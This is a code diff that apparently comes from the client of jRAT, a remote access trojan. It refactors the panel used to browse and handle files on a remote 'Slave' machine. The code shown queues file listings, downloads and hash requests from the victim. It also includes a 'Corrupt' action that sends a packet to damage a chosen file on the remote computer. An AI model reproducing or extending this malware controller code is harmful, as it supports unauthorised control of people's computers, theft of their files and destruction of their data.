@@ -22,6 +22,7 @@ import javax.swing.event.PopupMenuListener;
 import se.jrat.client.Drive;
 import se.jrat.client.Main;
 import se.jrat.client.Slave;
+import se.jrat.client.io.FileObject;
 import se.jrat.client.io.FileSystem;
 import se.jrat.client.listeners.DirListener;
 import se.jrat.client.packets.outgoing.Packet15ListFiles;
@@ -218,7 +219,8 @@ public class PanelRemoteFiles extends JPanel {
 					f.showSaveDialog(null);
 					
 					if (f.getSelectedFile() != null && f.getSelectedFile().getParentFile().exists()) {
-						if (tableModel.getValueAt(table.getSelectedRow(), 1).toString().length() > 0) {
+						FileObject fo = getSelectedFileObject();
+						if (fo != null && !fo.isDirectory()) {
 							TransferData data = new TransferData();
 							data.setLocalFile(f.getSelectedFile());
 							PanelFileTransfer.instance.add(data);
@@ -420,7 +422,7 @@ public class PanelRemoteFiles extends JPanel {
 			mntmMdHash.addActionListener(new ActionListener() {
 				@Override
 				public void actionPerformed(ActionEvent arg0) {
-					String file = tableModel.getValueAt(table.getSelectedRow(), 0).toString();
+					String file = getTableModel().getValueAt(table.getSelectedRow(), 0).toString();
 					if (file != null) {
 						slave.addToSendQueue(new Packet64FileHash(file));
 						waitingForMd5 = true;
@@ -432,7 +434,7 @@ public class PanelRemoteFiles extends JPanel {
 			JMenuItem mntmCorrupt = new JMenuItem("Corrupt");
 			mntmCorrupt.addActionListener(new ActionListener() {
 				public void actionPerformed(ActionEvent arg0) {
-					String file = tableModel.getValueAt(table.getSelectedRow(), 0).toString();
+					String file = getTableModel().getValueAt(table.getSelectedRow(), 0).toString();
 					if (file != null) {
 						slave.addToSendQueue(new Packet70CorruptFile(file));
 					}
@@ -456,8 +458,8 @@ public class PanelRemoteFiles extends JPanel {
 			mntmSelectAllFolders.addActionListener(new ActionListener() {
 				public void actionPerformed(ActionEvent arg0) {
 					int row = 0;
-					for (int i = 0; i < tableModel.getRowCount(); i++) {
-						String val = tableModel.getValueAt(i, 0).toString();
+					for (int i = 0; i < getTableModel().getRowCount(); i++) {
+						String val = getTableModel().getValueAt(i, 0).toString();
 						Main.debug(val);
 						if (val.substring(val.lastIndexOf(slave.getFileSeparator()), val.length()).contains(".")) {
 							row = i - 1;
@@ -474,15 +476,15 @@ public class PanelRemoteFiles extends JPanel {
 			mntmSelectAllFiles.addActionListener(new ActionListener() {
 				public void actionPerformed(ActionEvent e) {
 					int row = 0;
-					for (int i = 0; i < tableModel.getRowCount(); i++) {
-						String val = tableModel.getValueAt(i, 0).toString();
+					for (int i = 0; i < getTableModel().getRowCount(); i++) {
+						String val = getTableModel().getValueAt(i, 0).toString();
 						Main.debug(val);
 						if (val.substring(val.lastIndexOf(slave.getFileSeparator()), val.length()).contains(".")) {
 							row = i - 1;
 							break;
 						}
 					}
-					table.getSelectionModel().setSelectionInterval(row, tableModel.getRowCount());
+					table.getSelectionModel().setSelectionInterval(row, getTableModel().getRowCount());
 				}
 			});
 			mntmSelectAllFiles.setIcon(IconUtils.getIcon("documents-stack"));
@@ -514,8 +516,8 @@ public class PanelRemoteFiles extends JPanel {
 			mntmRefresh.addActionListener(new ActionListener() {
 				@Override
 				public void actionPerformed(ActionEvent e) {
-					while (tableModel.getRowCount() > 0) {
-						tableModel.removeRow(0);
+					while (getTableModel().getRowCount() > 0) {
+						getTableModel().removeRow(0);
 					}
 					slave.addToSendQueue(new Packet15ListFiles(txtDir.getText()));
 				}
